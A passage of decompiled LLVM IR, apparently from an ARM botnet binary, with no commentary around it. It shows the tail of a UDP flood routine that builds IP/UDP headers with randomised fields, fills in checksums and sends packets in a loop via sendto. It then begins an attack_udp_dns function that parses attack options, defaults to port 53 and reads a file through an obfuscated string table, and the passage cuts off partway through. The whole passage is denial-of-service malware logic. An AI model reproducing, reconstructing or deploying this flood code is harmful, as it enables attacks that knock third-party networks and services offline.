  %v1_bf60 = inttoptr i32 %v0_bf60 to i8*
  %v2_bf60 = load i8, i8* %v1_bf60, align 1
  %v1_bf64 = and i8 %v2_bf60, -16
  %v1_bf68 = or i8 %v1_bf64, 5
  store i8 %v1_bf68, i8* %v1_bf60, align 1
  %v2_bf74 = load i32, i32* @lr, align 4
  %v3_bf74 = add i32 %v2_bf74, 1
  %v4_bf74 = inttoptr i32 %v3_bf74 to i8*
  store i8 %v5_bde8, i8* %v4_bf74, align 1
  %v3_bf78 = load i32, i32* %stack_var_-48, align 4
  %v3_bf7c = mul i32 %v3_bf78, 65536
  %v1_bf80 = add i32 %v3_bf7c, 2097152
  %v3_bf84 = udiv i32 %v1_bf80, 256
  %v4_bf8c = udiv i32 %v1_bf80, 16777216
  %v5_bf8c = or i32 %v3_bf84, %v4_bf8c
  %v3_bf90 = urem i32 %v3_bf78, 65536
  store i32 %v3_bf90, i32* %r2.global-to-local, align 4
  %v1_bf94 = trunc i32 %v5_bf8c to i16
  %v2_bf94 = load i32, i32* @lr, align 4
  %v3_bf94 = add i32 %v2_bf94, 2
  %v4_bf94 = inttoptr i32 %v3_bf94 to i16*
  store i16 %v1_bf94, i16* %v4_bf94, align 2
  %v0_bf98 = load i32, i32* %r2.global-to-local, align 4
  %v1_bf98 = mul i32 %v0_bf98, 65536
  %v3_bfa0 = add i32 %v1_bf98, 786432
  store i32 %v3_bfa0, i32* %r2.global-to-local, align 4
  store i32 %v1_be30, i32* %ip.global-to-local, align 4
  %v2_bfa8 = load i32, i32* @lr, align 4
  %v3_bfa8 = add i32 %v2_bfa8, 8
  %v4_bfa8 = inttoptr i32 %v3_bfa8 to i8*
  store i8 %v1_bfa8, i8* %v4_bfa8, align 1
  %v0_bfac = load i32, i32* %r2.global-to-local, align 4
  %v3_bfac = udiv i32 %v0_bfac, 256
  %v1_bfb0 = and i32 %v3_bfac, 65280
  %v0_bfb4 = load i32, i32* %ip.global-to-local, align 4
  %v2_bfb4 = icmp eq i32 %v0_bfb4, 0
  store i1 %v2_bfb4, i1* %cpsr_z.global-to-local, align 1
  %v4_bfb8 = udiv i32 %v0_bfac, 16777216
  %v5_bfb8 = or i32 %v1_bfb0, %v4_bfb8
  store i32 %v5_bfb8, i32* %ip.global-to-local, align 4
  %v2_bfc0 = load i32, i32* @lr, align 4
  %v3_bfc0 = add i32 %v2_bfc0, 9
  %v4_bfc0 = inttoptr i32 %v3_bfc0 to i8*
  store i8 17, i8* %v4_bfc0, align 1
  store i32 ptrtoint (i32* @global_var_2471c.58 to i32), i32* %r3.global-to-local, align 4
  %v0_bfc8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_bfc8, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_bf24
  store i32 64, i32* %r2.global-to-local, align 4
  %v3_bfcc = load i32, i32* @lr, align 4
  %v4_bfcc = add i32 %v3_bfcc, 6
  %v5_bfcc = inttoptr i32 %v4_bfcc to i16*
  store i16 64, i16* %v5_bfcc, align 2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_bf24, %bb
  %v2_bfd0 = load i32, i32* @global_var_2471c.58, align 4
  %v1_bfd4 = load i32, i32* @lr, align 4
  %v2_bfd4 = add i32 %v1_bfd4, 12
  %v3_bfd4 = inttoptr i32 %v2_bfd4 to i32*
  store i32 %v2_bfd0, i32* %v3_bfd4, align 4
  store i32 %v2_bf40, i32* %r2.global-to-local, align 4
  %v1_bfdc = add i32 %v2_bf40, 16
  %v2_bfdc = inttoptr i32 %v1_bfdc to i32*
  %v3_bfdc = load i32, i32* %v2_bfdc, align 4
  %v1_bfe0 = load i32, i32* @lr, align 4
  %v2_bfe0 = add i32 %v1_bfe0, 16
  %v3_bfe0 = inttoptr i32 %v2_bfe0 to i32*
  store i32 %v3_bfdc, i32* %v3_bfe0, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_bfe8 = load i32, i32* @lr, align 4
  %v1_bfe8 = add i32 %v0_bfe8, 20
  store i32 %v1_bfe8, i32* %r4.global-to-local, align 4
  %v2_bfec = add i32 %v0_bfe8, 28
  %v3_bfec = inttoptr i32 %v2_bfec to i32*
  store i32 -1, i32* %v3_bfec, align 4
  %v0_bff0 = load i32, i32* @r5, align 4
  %v1_bff0 = trunc i32 %v0_bff0 to i16
  %v2_bff0 = load i32, i32* @lr, align 4
  %v3_bff0 = add i32 %v2_bff0, 4
  %v4_bff0 = inttoptr i32 %v3_bff0 to i16*
  store i16 %v1_bff0, i16* %v4_bff0, align 2
  %v0_bff4 = load i32, i32* @lr, align 4
  %v1_bff4 = add i32 %v0_bff4, 32
  %v0_bff8 = load i32, i32* %ip.global-to-local, align 4
  %v1_bff8 = trunc i32 %v0_bff8 to i16
  %v2_bff8 = load i32, i32* %r4.global-to-local, align 4
  %v3_bff8 = add i32 %v2_bff8, 4
  %v4_bff8 = inttoptr i32 %v3_bff8 to i16*
  store i16 %v1_bff8, i16* %v4_bff8, align 2
  %v0_bffc = load i32, i32* @r7, align 4
  %v1_bffc = trunc i32 %v0_bffc to i16
  %v2_bffc = load i32, i32* %r4.global-to-local, align 4
  %v3_bffc = add i32 %v2_bffc, 2
  %v4_bffc = inttoptr i32 %v3_bffc to i16*
  store i16 %v1_bffc, i16* %v4_bffc, align 2
  %v0_c000 = load i32, i32* @r6, align 4
  %v1_c000 = trunc i32 %v0_c000 to i16
  %v2_c000 = load i32, i32* @lr, align 4
  %v3_c000 = add i32 %v2_c000, 20
  %v4_c000 = inttoptr i32 %v3_c000 to i16*
  store i16 %v1_c000, i16* %v4_c000, align 2
  %v3_c004 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_c004, i32* %r2.global-to-local, align 4
  %v3_c008 = call i32 @util_memcpy(i32 %v1_bff4, i32 %v3_be7c, i32 %v3_c004)
  %v3_c00c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c00c, i32* %r3.global-to-local, align 4
  %v1_c010 = add i32 %v3_c00c, 1
  store i32 %v1_c010, i32* @r4, align 4
  %v1_c014 = load i32, i32* @r8, align 4
  %v9_c014 = icmp eq i32 %v1_c010, %v1_c014
  store i1 %v9_c014, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_c010, i32* %stack_var_-44, align 4
  %v5_c01c = icmp slt i32 %v1_c010, %v1_c014
  br i1 %v5_c01c, label %dec_label_pc_bf24, label %dec_label_pc_c020.preheader

dec_label_pc_c020.preheader:                      ; preds = %.thread, %dec_label_pc_bec8
  %v0_c024.ph = phi i32 [ 0, %dec_label_pc_bec8 ], [ %v1_c014, %.thread ]
  %v3_c060 = icmp eq i32 %v3_bed8, 65535
  br label %dec_label_pc_c020

dec_label_pc_c020:                                ; preds = %dec_label_pc_c020, %dec_label_pc_c10c, %dec_label_pc_c020.preheader
  %v0_c024 = phi i32 [ %v0_c024.ph, %dec_label_pc_c020.preheader ], [ 0, %dec_label_pc_c10c ], [ 0, %dec_label_pc_c020 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_c024 = icmp eq i32 %v0_c024, 0
  store i1 %v2_c024, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_c024, label %dec_label_pc_c020, label %dec_label_pc_c030

dec_label_pc_c030:                                ; preds = %dec_label_pc_c020, %dec_label_pc_c10c
  br label %dec_label_pc_c034

dec_label_pc_c034:                                ; preds = %dec_label_pc_c080, %dec_label_pc_c030
  %v1_c044 = phi i32 [ %v1_c0fc, %dec_label_pc_c080 ], [ 0, %dec_label_pc_c030 ]
  %v5_c038 = mul i32 %v1_c044, 24
  %v1_c03c = load i32, i32* @sl, align 4
  %v2_c03c = add i32 %v1_c03c, %v5_c038
  store i32 %v2_c03c, i32* %r3.global-to-local, align 4
  %v1_c040 = add i32 %v2_c03c, 20
  %v2_c040 = inttoptr i32 %v1_c040 to i8*
  %v3_c040 = load i8, i8* %v2_c040, align 1
  %v4_c040 = zext i8 %v3_c040 to i32
  store i32 %v4_c040, i32* %r2.global-to-local, align 4
  %v0_c044 = load i32, i32* @fp, align 4
  %v4_c044 = mul i32 %v1_c044, 4
  %v5_c044 = add i32 %v0_c044, %v4_c044
  %v6_c044 = inttoptr i32 %v5_c044 to i32*
  %v7_c044 = load i32, i32* %v6_c044, align 4
  store i32 %v7_c044, i32* @r5, align 4
  %v7_c04c = icmp eq i8 %v3_c040, 31
  store i1 %v7_c04c, i1* %cpsr_z.global-to-local, align 1
  store i32 65535, i32* @r7, align 4
  %v1_c054 = add i32 %v7_c044, 20
  store i32 %v1_c054, i32* @r6, align 4
  %tmp39 = icmp ult i8 %v3_c040, 32
  br i1 %tmp39, label %dec_label_pc_c120, label %dec_label_pc_c05c

dec_label_pc_c05c:                                ; preds = %dec_label_pc_c034
  store i32 %v3_bed8, i32* %r3.global-to-local, align 4
  store i1 %v3_c060, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_c060, label %dec_label_pc_c180, label %dec_label_pc_c068

dec_label_pc_c068:                                ; preds = %dec_label_pc_c120, %dec_label_pc_c05c
  %v1_c06c = phi i32 [ %v1_c178, %dec_label_pc_c120 ], [ 65535, %dec_label_pc_c05c ]
  store i32 %v3_bedc, i32* %ip.global-to-local, align 4
  %v9_c06c = icmp eq i32 %v3_bedc, %v1_c06c
  store i1 %v9_c06c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c06c, label %dec_label_pc_c194, label %dec_label_pc_c074

dec_label_pc_c074:                                ; preds = %dec_label_pc_c180.dec_label_pc_c074_crit_edge, %dec_label_pc_c068
  %v1_c078 = phi i32 [ %v1_c078.pre, %dec_label_pc_c180.dec_label_pc_c074_crit_edge ], [ %v1_c06c, %dec_label_pc_c068 ]
  %v9_c078 = icmp eq i32 %v3_bee0, %v1_c078
  store i1 %v9_c078, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c078, label %dec_label_pc_c1a8, label %dec_label_pc_c080

dec_label_pc_c080:                                ; preds = %dec_label_pc_c194, %dec_label_pc_c074, %dec_label_pc_c1a8
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_c084 = load i32, i32* @r5, align 4
  %v3_c084 = add i32 %v2_c084, 10
  %v4_c084 = inttoptr i32 %v3_c084 to i16*
  store i16 0, i16* %v4_c084, align 2
  %v0_c08c = load i32, i32* @r5, align 4
  store i32 %v0_c08c, i32* @r0, align 4
  %v2_c090 = call i32 @checksum_generic(i32 %v0_c08c, i32 20)
  %v3_c090 = trunc i32 %v2_c090 to i16
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_c098 = load i32, i32* @r5, align 4
  %v4_c098 = add i32 %v3_c098, 10
  %v5_c098 = inttoptr i32 %v4_c098 to i16*
  store i16 %v3_c090, i16* %v5_c098, align 2
  %v0_c09c = load i32, i32* %r3.global-to-local, align 4
  %v1_c09c = trunc i32 %v0_c09c to i16
  %v2_c09c = load i32, i32* @r6, align 4
  %v3_c09c = add i32 %v2_c09c, 6
  %v4_c09c = inttoptr i32 %v3_c09c to i16*
  store i16 %v1_c09c, i16* %v4_c09c, align 2
  %v3_c0a0 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_c0a0, i32* %r3.global-to-local, align 4
  %v0_c0a4 = load i32, i32* @r6, align 4
  store i32 %v0_c0a4, i32* @r1, align 4
  %v1_c0a8 = add i32 %v0_c0a4, 4
  %v2_c0a8 = inttoptr i32 %v1_c0a8 to i16*
  %v3_c0a8 = load i16, i16* %v2_c0a8, align 2
  %v4_c0a8 = zext i16 %v3_c0a8 to i32
  store i32 %v4_c0a8, i32* %r2.global-to-local, align 4
  %v1_c0ac = add i32 %v3_c0a0, 12
  store i32 %v1_c0ac, i32* %r3.global-to-local, align 4
  %v0_c0b0 = load i32, i32* @r5, align 4
  %v4_c0b4 = call i32 @checksum_tcpudp(i32 %v0_c0b0, i32 %v0_c0a4, i32 %v4_c0a8, i32 %v1_c0ac)
  %v5_c0b4 = trunc i32 %v4_c0b4 to i16
  %v3_c0b8 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c0b8, i32* %r3.global-to-local, align 4
  %v3_c0bc = mul i32 %v3_c0b8, 32
  store i32 %v3_c0bc, i32* %lr.global-to-local, align 4
  %v3_c0c0 = load i32, i32* @r6, align 4
  %v4_c0c0 = add i32 %v3_c0c0, 6
  %v5_c0c0 = inttoptr i32 %v4_c0c0 to i16*
  store i16 %v5_c0b4, i16* %v5_c0c0, align 2
  %v0_c0c4 = load i32, i32* %lr.global-to-local, align 4
  %v1_c0c4 = load i32, i32* %r3.global-to-local, align 4
  %tmp40 = mul i32 %v1_c0c4, -8
  %v5_c0c4 = add i32 %v0_c0c4, %tmp40
  store i32 %v5_c0c4, i32* %lr.global-to-local, align 4
  %v0_c0c8 = load i32, i32* @r6, align 4
  %v1_c0c8 = add i32 %v0_c0c8, 2
  %v2_c0c8 = inttoptr i32 %v1_c0c8 to i16*
  %v3_c0c8 = load i16, i16* %v2_c0c8, align 2
  %v4_c0c8 = zext i16 %v3_c0c8 to i32
  store i32 %v4_c0c8, i32* @r6, align 4
  %v3_c0cc = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_c0cc, i32* %r2.global-to-local, align 4
  %v1_c0d0 = load i32, i32* @sl, align 4
  %v2_c0d0 = add i32 %v1_c0d0, %v5_c0c4
  store i32 %v2_c0d0, i32* @lr, align 4
  %v3_c0d4 = add i32 %v2_c0d0, 2
  %v4_c0d4 = inttoptr i32 %v3_c0d4 to i16*
  store i16 %v3_c0c8, i16* %v4_c0d4, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_c0e0 = load i32, i32* @r5, align 4
  %v0_c0e4 = load i32, i32* %r2.global-to-local, align 4
  %v1_c0e4 = add i32 %v0_c0e4, 32
  store i32 %v1_c0e4, i32* %r2.global-to-local, align 4
  %v0_c0e8 = load i32, i32* @sb, align 4
  %v0_c0ec = load i32, i32* @lr, align 4
  %v6_c0f4 = call i32 @__libc_sendto(i32 %v0_c0e8, i32 %v0_c0e0, i32 %v1_c0e4, i32 16384, i32 %v0_c0ec, i32 16)
  %v3_c0f8 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c0f8, i32* %r3.global-to-local, align 4
  %v1_c0fc = add i32 %v3_c0f8, 1
  %v1_c100 = load i32, i32* @r8, align 4
  %v9_c100 = icmp eq i32 %v1_c0fc, %v1_c100
  store i1 %v9_c100, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_c0fc, i32* %stack_var_-44, align 4
  %v5_c108 = icmp slt i32 %v1_c0fc, %v1_c100
  br i1 %v5_c108, label %dec_label_pc_c034, label %dec_label_pc_c10c

dec_label_pc_c10c:                                ; preds = %dec_label_pc_c080
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_c110 = icmp eq i32 %v1_c100, 0
  store i1 %v2_c110, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_c110, label %dec_label_pc_c020, label %dec_label_pc_c030

dec_label_pc_c120:                                ; preds = %dec_label_pc_c034
  %v1_c120 = add i32 %v2_c03c, 16
  %v2_c120 = inttoptr i32 %v1_c120 to i32*
  %v3_c120 = load i32, i32* %v2_c120, align 4
  store i32 %v3_c120, i32* @r4, align 4
  %v0_c124 = call i32 @rand_next()
  %v3_c128 = load i32, i32* %stack_var_-44, align 4
  %v5_c130 = mul i32 %v3_c128, 24
  %v0_c134 = load i32, i32* @r4, align 4
  %v1_c134 = and i32 %v0_c134, 16711680
  store i32 %v1_c134, i32* %ip.global-to-local, align 4
  %v3_c138 = udiv i32 %v0_c134, 16777216
  %v4_c13c = udiv i32 %v1_c134, 256
  %v5_c13c = or i32 %v4_c13c, %v3_c138
  store i32 %v5_c13c, i32* %r2.global-to-local, align 4
  %v1_c140 = load i32, i32* @sl, align 4
  %v2_c140 = add i32 %v1_c140, %v5_c130
  %v1_c144 = and i32 %v0_c134, 65280
  store i32 %v1_c144, i32* %r3.global-to-local, align 4
  %v1_c148 = add i32 %v2_c140, 20
  %v2_c148 = inttoptr i32 %v1_c148 to i8*
  %v3_c148 = load i8, i8* %v2_c148, align 1
  %v4_c148 = zext i8 %v3_c148 to i32
  store i32 %v4_c148, i32* %ip.global-to-local, align 4
  %v5_c150 = call i32 @llvm.bswap.i32(i32 %v0_c134)
  %v7_c154 = lshr i32 %v0_c124, %v4_c148
  %v8_c154 = add i32 %v7_c154, %v5_c150
  store i32 %v8_c154, i32* %r2.global-to-local, align 4
  %v5_c16c = call i32 @llvm.bswap.i32(i32 %v8_c154)
  %v1_c170 = load i32, i32* @r5, align 4
  %v2_c170 = add i32 %v1_c170, 16
  %v3_c170 = inttoptr i32 %v2_c170 to i32*
  store i32 %v5_c16c, i32* %v3_c170, align 4
  store i32 %v3_bed8, i32* %r3.global-to-local, align 4
  %v1_c178 = load i32, i32* @r7, align 4
  %v9_c178 = icmp eq i32 %v3_bed8, %v1_c178
  store i1 %v9_c178, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c178, label %dec_label_pc_c180, label %dec_label_pc_c068

dec_label_pc_c180:                                ; preds = %dec_label_pc_c120, %dec_label_pc_c05c
  %v0_c180 = call i32 @rand_next()
  %v1_c180 = trunc i32 %v0_c180 to i16
  store i32 %v3_bedc, i32* %ip.global-to-local, align 4
  %v1_c188 = load i32, i32* @r7, align 4
  %v9_c188 = icmp eq i32 %v3_bedc, %v1_c188
  store i1 %v9_c188, i1* %cpsr_z.global-to-local, align 1
  %v3_c18c = load i32, i32* @r5, align 4
  %v4_c18c = add i32 %v3_c18c, 4
  %v5_c18c = inttoptr i32 %v4_c18c to i16*
  store i16 %v1_c180, i16* %v5_c18c, align 2
  br i1 %v9_c188, label %dec_label_pc_c194, label %dec_label_pc_c180.dec_label_pc_c074_crit_edge

dec_label_pc_c180.dec_label_pc_c074_crit_edge:    ; preds = %dec_label_pc_c180
  %v1_c078.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_c074

dec_label_pc_c194:                                ; preds = %dec_label_pc_c180, %dec_label_pc_c068
  %v0_c194 = call i32 @rand_next()
  %v1_c194 = trunc i32 %v0_c194 to i16
  %v1_c19c = load i32, i32* @r7, align 4
  %v9_c19c = icmp eq i32 %v3_bee0, %v1_c19c
  store i1 %v9_c19c, i1* %cpsr_z.global-to-local, align 1
  %v3_c1a0 = load i32, i32* @r5, align 4
  %v4_c1a0 = add i32 %v3_c1a0, 20
  %v5_c1a0 = inttoptr i32 %v4_c1a0 to i16*
  store i16 %v1_c194, i16* %v5_c1a0, align 2
  br i1 %v9_c19c, label %dec_label_pc_c1a8, label %dec_label_pc_c080

dec_label_pc_c1a8:                                ; preds = %dec_label_pc_c194, %dec_label_pc_c074
  %v0_c1a8 = call i32 @rand_next()
  %v1_c1a8 = trunc i32 %v0_c1a8 to i16
  %v3_c1ac = load i32, i32* @r6, align 4
  %v4_c1ac = add i32 %v3_c1ac, 2
  %v5_c1ac = inttoptr i32 %v4_c1ac to i16*
  store i16 %v1_c1a8, i16* %v5_c1ac, align 2
  br label %dec_label_pc_c080

dec_label_pc_c1b4:                                ; preds = %dec_label_pc_bea0
  %v0_c1b4 = load i32, i32* @sb, align 4
  %v1_c1b8 = call i32 @__GI___libc_close(i32 %v0_c1b4)
  br label %dec_label_pc_c1bc

dec_label_pc_c1bc:                                ; preds = %entry, %dec_label_pc_c1b4
  %v1_c1c4 = phi i32 [ %v3_be90, %entry ], [ %v1_c1b8, %dec_label_pc_c1b4 ]
  store i32 %v3_bd94, i32* %r4.global-to-local, align 4
  store i32 %v27_bd94, i32* %lr.global-to-local, align 4
  ret i32 %v1_c1c4

; uselistorder directives
  uselistorder i32 %v1_c178, { 1, 0 }
  uselistorder i32 %v0_c134, { 1, 2, 0, 3 }
  uselistorder i32 %v1_c0fc, { 2, 0, 3, 1 }
  uselistorder i32 %v5_c0c4, { 1, 0 }
  uselistorder i1 %v3_c060, { 1, 0 }
  uselistorder i32 %v1_c010, { 1, 0, 2, 3 }
  uselistorder i32 %v3_bf78, { 1, 0 }
  uselistorder i32 %v3_bf10, { 1, 0 }
  uselistorder i32 %v3_bf0c, { 1, 0 }
  uselistorder i32 %v0_bed0, { 1, 0, 3, 2 }
  uselistorder i32 %v0_becc, { 1, 0, 2 }
  uselistorder i32 %v0_bec8, { 1, 0, 3, 2 }
  uselistorder i1 %v7_bec0, { 1, 0 }
  uselistorder i1 %v7_be94, { 1, 0 }
  uselistorder i32 %v3_be90, { 1, 2, 3, 0 }
  uselistorder i32 %v1_be30, { 1, 2, 0 }
  uselistorder i32 %v5_be24, { 1, 0 }
  uselistorder i32 %v6_bdc8, { 1, 2, 0 }
  uselistorder i32* %stack_var_-48, { 1, 2, 3, 4, 0 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 14, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_c1bc, { 1, 0 }
  uselistorder label %dec_label_pc_c080, { 2, 0, 1 }
  uselistorder label %dec_label_pc_c030, { 1, 0 }
  uselistorder label %dec_label_pc_c020, { 1, 0, 2 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @attack_udp_dns(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-2124 = alloca i32, align 4
  %v18_c1cc = load i32, i32* @sb, align 4
  %v27_c1cc = load i32, i32* @lr, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r8, align 4
  %v2_c1ec = call i32 @calloc(i32 %arg1, i32 4)
  %v0_c1f0 = load i32, i32* @r5, align 4
  store i32 %v0_c1f0, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_c1fc = load i32, i32* @r4, align 4
  store i32 %v0_c1fc, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v5_c204 = inttoptr i32 %v0_c1f0 to i32*
  %v6_c204 = call i32 @attack_get_opt_int(i32 %v0_c1fc, i32* %v5_c204, i32 2, i32 0, i32 %v2_c1ec)
  %v1_c210 = urem i32 %v6_c204, 256
  store i32 %v1_c210, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_c21c = load i32, i32* @r4, align 4
  store i32 %v0_c21c, i32* %r0.global-to-local, align 4
  %v0_c220 = load i32, i32* @r5, align 4
  store i32 %v0_c220, i32* %r1.global-to-local, align 4
  %sext22 = mul i32 %v6_c204, 16777216
  %v5_c228 = sdiv i32 %sext22, 16777216
  %v6_c228 = inttoptr i32 %v0_c220 to i32*
  %v7_c228 = call i32 @attack_get_opt_int(i32 %v0_c21c, i32* %v6_c228, i32 3, i32 65535, i32 %v5_c228)
  %v0_c22c = load i32, i32* @r5, align 4
  store i32 %v0_c22c, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v0_c238 = load i32, i32* @r4, align 4
  store i32 %v0_c238, i32* %r0.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v5_c240 = inttoptr i32 %v0_c22c to i32*
  %v6_c240 = call i32 @attack_get_opt_int(i32 %v0_c238, i32* %v5_c240, i32 4, i32 64, i32 %v7_c228)
  %v1_c248 = urem i32 %v6_c240, 256
  store i32 %v1_c248, i32* %ip.global-to-local, align 4
  %v0_c24c = load i32, i32* @r5, align 4
  store i32 %v0_c24c, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c258 = load i32, i32* @r4, align 4
  store i32 %v0_c258, i32* %r0.global-to-local, align 4
  %sext23 = mul i32 %v6_c240, 16777216
  %v5_c260 = sdiv i32 %sext23, 16777216
  %v6_c260 = inttoptr i32 %v0_c24c to i32*
  %v7_c260 = call i32 @attack_get_opt_int(i32 %v0_c258, i32* %v6_c260, i32 5, i32 0, i32 %v5_c260)
  %v1_c26c = urem i32 %v7_c260, 256
  store i32 %v1_c26c, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_c278 = load i32, i32* @r4, align 4
  store i32 %v0_c278, i32* %r0.global-to-local, align 4
  %v0_c27c = load i32, i32* @r5, align 4
  store i32 %v0_c27c, i32* %r1.global-to-local, align 4
  %v5_c284 = inttoptr i32 %v0_c27c to i32*
  %v6_c284 = call i32 @attack_get_opt_int(i32 %v0_c278, i32* %v5_c284, i32 6, i32 65535, i32 %v1_c26c)
  %v0_c288 = load i32, i32* @r5, align 4
  store i32 %v0_c288, i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_c294 = load i32, i32* @r4, align 4
  store i32 %v0_c294, i32* %r0.global-to-local, align 4
  store i32 53, i32* %r3.global-to-local, align 4
  %v5_c29c = inttoptr i32 %v0_c288 to i32*
  %v6_c29c = call i32 @attack_get_opt_int(i32 %v0_c294, i32* %v5_c29c, i32 7, i32 53, i32 %v6_c284)
  %v0_c2a8 = load i32, i32* @r5, align 4
  store i32 %v0_c2a8, i32* %r1.global-to-local, align 4
  %v0_c2ac = load i32, i32* @r4, align 4
  store i32 %v0_c2ac, i32* %r0.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v5_c2b8 = inttoptr i32 %v0_c2a8 to i32*
  %v6_c2b8 = call i32 @attack_get_opt_int(i32 %v0_c2ac, i32* %v5_c2b8, i32 9, i32 65535, i32 %v6_c29c)
  %v0_c2bc = load i32, i32* @r5, align 4
  store i32 %v0_c2bc, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_c2c8 = load i32, i32* @r4, align 4
  store i32 %v0_c2c8, i32* %r0.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v5_c2d0 = inttoptr i32 %v0_c2bc to i32*
  %v6_c2d0 = call i32 @attack_get_opt_int(i32 %v0_c2c8, i32* %v5_c2d0, i32 0, i32 12, i32 %v6_c2b8)
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c2dc = load i32, i32* @r5, align 4
  store i32 %v0_c2dc, i32* %r1.global-to-local, align 4
  store i32 %v6_c2d0, i32* %sb.global-to-local, align 4
  %v0_c2e4 = load i32, i32* @r4, align 4
  store i32 %v0_c2e4, i32* %r0.global-to-local, align 4
  %v4_c2e8 = inttoptr i32 %v0_c2dc to i32*
  %v5_c2e8 = call i32 @attack_get_opt_str(i32 %v0_c2e4, i32* %v4_c2e8, i32 8, i32 0)
  store i32 %v5_c2e8, i32* @r7, align 4
  store i32 24, i32* %r0.global-to-local, align 4
  %v1_c2f4 = call i32 @table_unlock_val(i32 24)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 24, i32* %r0.global-to-local, align 4
  %v3_c300 = call i32 @table_retrieve_val(i32 24, i32* null)
  store i32 %v3_c300, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_c308 = call i32 @__libc_open(i32 %v3_c300, i32 0)
  store i32 %v2_c308, i32* @r4, align 4
  store i32 24, i32* %r0.global-to-local, align 4
  %v1_c314 = call i32 @table_lock_val(i32 24)
  store i32 %v1_c314, i32* %r0.global-to-local, align 4
  %v0_c318 = load i32, i32* @r4, align 4
  %v1_c318 = icmp slt i32 %v0_c318, 0
  %v2_c318 = icmp eq i32 %v0_c318, 0
  store i1 %v2_c318, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_c318, label %dec_label_pc_c814, label %dec_label_pc_c320

dec_label_pc_c320:                                ; preds = %entry
  %v2_c324 = ptrtoint i32* %stack_var_-2124 to i32
  store i32 %v2_c324, i32* @sl, align 4
  store i32 2048, i32* @r2, align 4
  store i32 %v2_c324, i32* @r1, align 4
  store i32 %v0_c318, i32* %r0.global-to-local, align 4
  %v1_c334 = call i32 @__libc_read(i32 %v0_c318)
  store i32 %v1_c334, i32* @r5, align 4
  %v0_c33c = load i32, i32* @r4, align 4
  store i32 %v0_c33c, i32* %r0.global-to-local, align 4
  %v1_c340 = call i32 @__GI___libc_close(i32 %v0_c33c)
  store i32 25, i32* %r0.global-to-local, align 4
  %v1_c348 = call i32 @table_unlock_val(i32 25)
  store i32 0, i32* %r1.global-to-local, align 4
